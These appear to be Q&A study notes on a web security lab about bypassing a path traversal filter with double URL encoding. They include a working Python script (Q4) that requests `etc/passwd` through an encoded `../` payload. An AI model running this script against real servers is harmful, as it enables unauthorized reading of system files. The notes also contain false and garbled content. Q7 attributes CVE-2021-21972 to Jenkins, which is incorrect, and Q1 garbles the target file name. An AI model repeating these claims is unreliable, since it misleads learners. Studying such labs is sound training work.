---
course: Web Security
topic: Directory Traversal
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the primary goal of the lab described in the lecture?**

The primary goal of the lab is to retrieve the contents of the `ATC passWD` file by exploiting a file path traversal vulnerability. The application blocks input containing path traversal sequences and performs a URL decode of the input before using it, making the exploitation process more challenging.

**Q2. How does the application defend against file path traversal attacks?**

The application defends against file path traversal attacks by blocking input containing path traversal sequences (such as `../`). Additionally, it performs a URL decode of the input before using it, which complicates attempts to bypass the path traversal sequence detection.

**Q3. Explain how you can bypass the path traversal sequence detection in this lab.**

To bypass the path traversal sequence detection, you can URL encode the path traversal sequence multiple times. Since the application only decodes the input once and then checks for the path traversal sequence, encoding the sequence multiple times ensures that the sequence remains hidden during the initial decode. For example, encoding `../` multiple times might look like `%252e%252e%252f`, which the application would decode to `../` only once, allowing the traversal to succeed.

**Q4. Write a Python script to automate the exploitation of the file path traversal vulnerability described in the lecture.**

```python
import sys
import requests
from urllib.parse import quote_plus

def disable_warnings():
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def set_proxy():
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    return proxies

def directory_traversal_exploit(url):
    image_url = url + "/images/product/1?filename=" + quote_plus(quote_plus("../") * 5 + "etc/passwd")
    r = requests.get(image_url, verify=False, proxies=set_proxy())
    
    if "root:" in r.text:
        print("Exploit successful.")
        print("The following is the content of the passwd file:")
        print(r.text)
    else:
        print("Exploit failed.")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    print(f"Exploiting directory traversal vulnerability at {url}")
    disable_warnings()
    directory_traversal_exploit(url)
```

**Q5. How does the script ensure that the request is sent through Burp Suite?**

The script ensures that the request is sent through Burp Suite by setting up a proxy dictionary and passing it to the `requests.get()` method. The proxy dictionary specifies the IP address and port where Burp Suite is running (typically `127.0.0.1:8080`). By including this proxy configuration, all requests made by the script are routed through Burp Suite, allowing for interception and analysis.

**Q6. Why is it important to disable SSL certificate verification in the script?**

Disabling SSL certificate verification is important in the script because many web applications use self-signed or invalid SSL certificates. Disabling verification allows the script to make requests to these applications without encountering SSL certificate validation errors. This is particularly useful in testing environments where the focus is on exploiting vulnerabilities rather than ensuring secure connections.

**Q7. Can you provide a recent real-world example of a file path traversal vulnerability and explain its impact?**

A recent real-world example of a file path traversal vulnerability is the CVE-2021-21972 found in the Jenkins Continuous Integration server. This vulnerability allowed attackers to read arbitrary files on the server, including sensitive configuration files and credentials. Exploiting this vulnerability could lead to unauthorized access to the server and further compromise of the network. The impact includes potential data theft, privilege escalation, and the ability to execute arbitrary commands on the server.

---
<!-- nav -->
[[05-Understanding the Lab|Understanding the Lab]] | [[Web Security (PortSwigger)/11-Directory Traversal/05-Lab 4 File path traversal traversal sequences stripped with superfluous URL decode/00-Overview|Overview]]
